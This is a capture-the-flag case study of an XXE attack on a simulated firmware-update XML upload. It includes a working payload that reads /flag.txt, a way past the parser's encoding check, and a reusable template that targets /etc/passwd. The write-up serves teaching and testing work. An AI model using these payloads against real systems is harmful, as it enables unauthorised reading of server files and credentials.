# Case Study: XXE File Read via Firmware Update XML (CTF)

## Overview
This case study documents the exploitation of an XXE (XML External Entity) vulnerability in a CTF challenge where a firmware update feature accepted XML input. By defining a malicious external entity and leveraging a reflected XML field, the server was tricked into reading and returning local file contents.

## Target Context

- **Application**: Simulated IoT firmware update system.
- **Feature**: XML-based firmware update configuration upload.
- **Reflected field**: The `<Version>` tag's value was echoed back in a confirmation message.

## Vulnerability

**Type**: XML External Entity (XXE) Injection — Classic file read.

The server parsed incoming XML firmware update configurations without disabling external entity processing. When the XML contained an entity referencing a local file, the parser resolved it and included the file's contents in the processed output.

## Exploitation

### 1. Understanding the response behavior

The application returned a confirmation message:
```
Firmware version [VERSION] update initiated.
```

Where `[VERSION]` was taken directly from the `<Version>` tag in the submitted XML. This is the **reflection point** — the place where injected data appears in the response.

### 2. Defining the malicious entity

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
```

This tells the XML parser: "Create an entity called `xxe` whose value is the contents of `/flag.txt` on the server filesystem."

### 3. Injecting the entity reference

Place `&xxe;` inside the `<Version>` tag (the reflected field):

```xml
<Version>&xxe;</Version>
```

When the parser processes this, it replaces `&xxe;` with the actual contents of `flag.txt`.

### 4. The complete payload

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
    </Components>
</FirmwareUpdateConfig>
```

### 5. Bypassing the encoding check

The original XML declaration (`<?xml version="1.0" encoding="UTF-8"?>`) caused the parser to reject the payload because the file contents conflicted with the declared encoding.

**Fix**: Remove the XML declaration entirely. Without it, the parser accepts the content as-is without attempting encoding validation.

### 6. Result

The server responded with:
```
Firmware version [file contents here] update initiated.
```

The contents of the target file were displayed in place of the version string.

## Key Takeaways

1. **XXE requires two things**: an entity definition (the payload) and a **reflection point** (where the entity's value appears in the response).
2. **Encoding headers can block XXE** — if the entity content doesn't match the declared encoding, the parser may reject it. Removing the `<?xml ... encoding="..."?>` declaration is a simple bypass.
3. **Any XML field that gets reflected** in the response is a potential injection point — test each one.
4. **The same approach scales to real applications**: firmware updaters, document processors, SOAP APIs, SVG renderers, and any feature that accepts XML input.

## Generalized Payload Template

Save this for reuse when you find an XML-accepting endpoint:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<RootElement>
    <ReflectedField>&xxe;</ReflectedField>
</RootElement>
```

Replace:
- `file:///etc/passwd` with the target file path.
- `<ReflectedField>` with whatever tag gets reflected in the response.

## References

- `techniques/xxe-injection.md` (comprehensive XXE guide)
- `case-studies/case-study-ssrf-xmlrpc-wordpress.md` (related XML-based attack)
